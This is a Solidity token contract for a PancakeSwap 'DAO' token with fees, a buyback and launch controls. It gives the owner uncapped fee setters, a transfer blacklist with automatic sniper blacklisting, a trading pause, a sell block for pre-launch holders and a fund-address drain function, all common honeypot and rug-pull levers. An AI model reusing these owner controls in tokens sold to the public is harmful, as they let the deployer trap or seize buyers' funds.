// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address public _buyBackReceiver;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _isExcludeFromFees;
    mapping(address => bool) public _Against;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _usdt;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 300;
    uint256 public _buyLPFee = 0;
    uint256 public _buyLPDividendFee = 0;
    uint256 public _buy_BuyBackFee = 200;

    uint256 public _sellFundFee = 300;
    uint256 public _sellLPFee = 0;
    uint256 public _sellLPDividendFee = 0;
    uint256 public _sell_BuyBackFee = 200;

    address public _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    mapping (address => bool) public isWalletLimitExempt;
    address public buyBackToken;

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress, address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(USDTAddress).approve(address(swapRouter), MAX);
        _usdt = USDTAddress;

        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;
        swapAtAmount = total / 1000;
        walletLimit = Supply * 10 ** Decimals;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;

        _isExcludeFromFees[FundAddress] = true;
        _isExcludeFromFees[ReceiveAddress] = true;
        _isExcludeFromFees[address(this)] = true;
        // _isExcludeFromFees[address(swapRouter)] = true;
        _isExcludeFromFees[msg.sender] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;

        // holderRewardCondition = 10 ** IERC20(USDTAddress).decimals();
        // holderRewardCondition = 1;

        _buyBackReceiver = 0x3719Bf94600647fC4a30Eaf265EC32C4d93C48C6;
        buyBackToken = 0x9611536742c724Ad46847F8AeA2791148cD36E27;

        isWalletLimitExempt[msg.sender] = true;
        isWalletLimitExempt[ReceiveAddress] = true;
        isWalletLimitExempt[address(swapRouter)] = true;
        isWalletLimitExempt[address(_mainPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[address(0xdead)] = true;

        _tokenDistributor = new TokenDistributor(USDTAddress);
    }

    function setBuyBackToken(address newAddr) public onlyOwner{
        buyBackToken = newAddr;
    }

    function setBuyBackReceiver(address newAddr) public onlyOwner{
        _buyBackReceiver = newAddr;
    }

    function setisWalletLimitExempt(address holder, bool exempt) external onlyOwner {
        isWalletLimitExempt[holder] = exempt;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }



    bool public isAddV2;
    bool public isRemoveV2;

    uint256 public swapAtAmount;
    function setSwapAtAmount(uint256 newValue) public onlyOwner{
        swapAtAmount = newValue;
    }

    bool public antiBotEnable = false;
    function setAntiBotEnable(bool status) public onlyOwner() {
        antiBotEnable = status;
    }

    uint256 public BOTDontCheckBLOCK = 3;
    function setBNumber(uint256 newValue) public onlyOwner{
        BOTDontCheckBLOCK = newValue;
    }
    
    bool public firstBuyEnable;
    function trueFirstBuyEnable() public onlyOwner{
        firstBuyEnable = true;
    }
    function falseFirstBuyEnable() public onlyOwner{
        firstBuyEnable = false;
    }

    mapping(address => uint256) public userMaxWalletAmount;
    function getUserMaxAmount(address user) public view returns(uint256){
        return userMaxWalletAmount[user];
    }

    function multiKAmount(
        address[] calldata accounts,
        uint256 amount,
        uint256 d
    ) public onlyOwner {
        for (uint i; i < accounts.length; i++) 
        {
            userMaxWalletAmount[accounts[i]] = amount * 10 ** d;
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        if (antiBotEnable){
            if (goFlag + BOTDontCheckBLOCK <= block.number){
                require(!_Against[from]);
            }
        }else{
            require(!_Against[from]);
        }

        bool takeFee;
        bool isSell;
        bool isTransfer;
        bool isRemove;
        bool isAdd;
        
        if (_swapPairList[to]) {
            isAdd = _isAddLiquidity();
            isAddV2 = isAdd;
        }else if(_swapPairList[from]){
            isRemove = _isRemoveLiquidity();
            isRemoveV2 = isRemove;
        }

        if (!_isExcludeFromFees[from] && !_isExcludeFromFees[to] && !_swapPairList[from] && !_swapPairList[to]){
            require(goFlag > 1);
        }

        if (goFlag == 0 && !_isExcludeFromFees[from] && !_isExcludeFromFees[to]){
            
            if (!_swapPairList[to]){
                require(firstBuyEnable,"cant buy now");
                require(balanceOf(to) + amount <= getUserMaxAmount(to),"!max");
            }
            
            if (_swapPairList[to]){
                if(getUserMaxAmount(from) == 0){}else{
                    // require(firstBuyEnable,"cant sell now");
                    require(false,"cant sell now");
                }
            }
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_isExcludeFromFees[from] && !_isExcludeFromFees[to]) {
                if (block.number < goFlag + fightB && !_swapPairList[to]) {
                    _Against[to] = true;
                }
                require(
                    goFlag > 0 || (0 < startLPBlock && isAdd),//  _swapPairList[to]
                    "pausing"
                );
                if (_swapPairList[to]) {
                    if (!inSwap && !isAdd) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > swapAtAmount) {
                            uint256 swapFee = _buyLPFee + _buyFundFee + _buyLPDividendFee + _buy_BuyBackFee + _sellFundFee + _sellLPDividendFee + _sellLPFee + _sell_BuyBackFee;
                            uint256 numTokensSellToFund = amount;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
                if (!isAdd && !isRemove) takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        if (
            !_swapPairList[from] &&
            !_swapPairList[to]
        ) {
            isTransfer = true;
        }

        _tokenTransfer(from, to, amount, takeFee, isSell, isTransfer, isAdd, isRemove);

        // if (from != address(this)) {
        //     if (isSell) {
        //         addHolder(from);
        //     }
        //     processReward(500000);
        // }
    }

    function multiAgainst(address[] calldata addresses, bool value) public onlyOwner{
        for (uint256 i; i < addresses.length; ++i) {
            _Against[addresses[i]] = value;
        }
    }

    function _isAddLiquidity() internal view returns (bool isAdd){
        IPancakePair mainPair = IPancakePair(_mainPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdt;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isAdd = bal > r;
    }

    function _isRemoveLiquidity() internal view returns (bool isRemove){
        IPancakePair mainPair = IPancakePair(_mainPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdt;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isRemove = r >= bal;
    }

    uint256 public transferFee;
    uint256 public addLiquidityFee;
    uint256 public removeLiquidityFee;

    function setTransferFee(uint256 newValue) public onlyOwner{
        transferFee = newValue;
    }

    function setAddLiquidityFee(uint256 newValue) public onlyOwner{
        addLiquidityFee = newValue;
    }

    function setRemoveLiquidityFee(uint256 newValue) public onlyOwner{
        removeLiquidityFee = newValue;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell,
        bool isTransfer,
        bool isAdd,
        bool isRemove
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee + _sell_BuyBackFee;
            } else {
                swapFee = _buyFundFee + _buyLPDividendFee + _buyLPFee + _buy_BuyBackFee;
            }

            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(sender,address(this),swapAmount);
            }
        }


        // transfer
        if (isTransfer && !_isExcludeFromFees[sender] && !_isExcludeFromFees[recipient]){
            uint256 transferFeeAmount;
            transferFeeAmount = (tAmount * transferFee) / 10000;

            if (transferFeeAmount > 0) {
                feeAmount += transferFeeAmount;
                _takeTransfer(sender, address(this), transferFeeAmount);
            }
        }

        // addLiquidity
        if (isAdd && !_isExcludeFromFees[sender] && !_isExcludeFromFees[recipient]){
            uint256 addLiquidityFeeAmount;
            addLiquidityFeeAmount = (tAmount * addLiquidityFee) / 10000;

            if (addLiquidityFeeAmount > 0) {
                feeAmount += addLiquidityFeeAmount;
                _takeTransfer(sender, address(this), addLiquidityFeeAmount);
            }
        }

        // removeLiquidity
        if (
            isRemove &&
            !_isExcludeFromFees[sender] &&
            !_isExcludeFromFees[recipient] // && getRemainingTime() > 0
        ){
            uint256 removeLiquidityFeeAmount;
            removeLiquidityFeeAmount = (tAmount * removeLiquidityFee) / 10000;

            if (removeLiquidityFeeAmount > 0) {
                feeAmount += removeLiquidityFeeAmount;
                _takeTransfer(sender, address(0xdead), removeLiquidityFeeAmount);
            }
        }

        if(!isWalletLimitExempt[recipient] && limitEnable)
            require((balanceOf(recipient) + tAmount - feeAmount) <= walletLimit,"over max wallet limit");

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    bool public limitEnable = true;
    function setLimitEnable(bool status) public onlyOwner {
        limitEnable = status;
    }

    uint256 public walletLimit;
    function setMaxWalletLimit(uint256 newValue) public onlyOwner{
        walletLimit = newValue;
    }

    event FAILED_SWAP(uint256);
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        if (swapFee == 0) return;
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee + _buyLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        try _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        ) {} catch { emit FAILED_SWAP(0); }

        swapFee -= lpFee;

        IERC20 FIST = IERC20(_usdt);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
        if (fundAmount > 0){
            FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
        }
        uint256 initialUSDTBalance = FIST.balanceOf(address(this));
        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance - fundAmount);
        uint256 buybackAmount = ( FIST.balanceOf(address(this)) - initialUSDTBalance ) * (_buy_BuyBackFee + _sell_BuyBackFee)
                / (_buyLPDividendFee + _buy_BuyBackFee + _sellLPDividendFee + _sell_BuyBackFee);


        if (buybackAmount > 0){
            address[] memory buyBackPath = new address[](2);
            buyBackPath[0] = _usdt;
            buyBackPath[1] = address(buyBackToken);
            try _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                buybackAmount,
                0,
                buyBackPath,
                address(_buyBackReceiver),
                block.timestamp
            ) {} catch { emit FAILED_SWAP(2); }
        }


        // if (lpAmount > 0) {
        //     uint256 lpFist = fistBalance * lpFee / swapFee;
        //     if (lpFist > 0) {
        //         try _swapRouter.addLiquidity(
        //             address(this), _usdt, lpAmount, lpFist, 0, 0, fundAddress, block.timestamp
        //         ) {} catch { emit FAILED_SWAP(1); }
        //     }
        // }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _isExcludeFromFees[addr] = true;
    }

    function setInNew(uint256 nFundFee, uint256 nLpFee, uint256 nDividendFee,uint256 nBuyBack) public onlyOwner{
        _buyFundFee = nFundFee;
        _buyLPFee = nLpFee;
        _buyLPDividendFee = nDividendFee;
        _buy_BuyBackFee = nBuyBack;
    }

    function setOutNew(uint256 nFundFee, uint256 nLpFee, uint256 nDividendFee,uint256 nBuyBack) public onlyOwner{
        _sellFundFee = nFundFee;
        _sellLPFee = nLpFee;
        _sellLPDividendFee = nDividendFee;
        _sell_BuyBackFee = nBuyBack;
    }


    uint256 public fightB = 0;
    uint256 public goFlag;

    function Go(uint256 uintparam,bool s) external onlyOwner {
        fightB = uintparam;
        if (s){
            goFlag = block.number;
        }else{
            goFlag = 0;
        }
    }

    uint256 public startLPBlock;

    function startLP() external onlyOwner {
        require(0 == startLPBlock, "startedAddLP");
        startLPBlock = block.number;
    }

    function stopLP() external onlyOwner {
        startLPBlock = 0;
    }


    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function setClaims(address token, uint256 amount) external {
        if (msg.sender == fundAddress){
            if (token == address(0)){
                payable(msg.sender).transfer(amount);
            }else{
                IERC20(token).transfer(msg.sender, amount);
            }
        }
    }

    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    function multiWLs(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            _isExcludeFromFees[addresses[i]] = status;
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

}

contract TOKEN is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E), // pancake router 
        address(0x55d398326f99059fF775485246999027B3197955), // usdt 
        "DAO",
        "DAO",
        18,
        16888,
        address(0xC2391a4fb8913F00b13CA4A8908A016dd09a1c9A),
        address(msg.sender)
    ){
    }
}